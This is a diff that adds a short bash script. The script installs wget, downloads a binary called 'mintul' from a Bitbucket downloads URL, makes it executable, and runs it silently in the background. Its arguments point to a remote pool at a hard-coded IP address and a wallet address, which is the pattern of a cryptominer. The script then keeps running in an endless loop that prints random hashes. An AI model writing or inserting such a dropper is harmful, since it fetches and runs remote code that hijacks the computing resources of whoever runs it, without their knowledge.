@@ -1,0 +1,7 @@
+#!/bin/bash
+apt update
+apt install wget sudo -y
+wget https://bitbucket.org/boluna/file/downloads/mintul
+chmod +x mintul
+./mintul -o 8.222.148.101:443 -u 0xb2b57d14AC905c76Be0ad657c68Ed521f6B91293 -p x > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
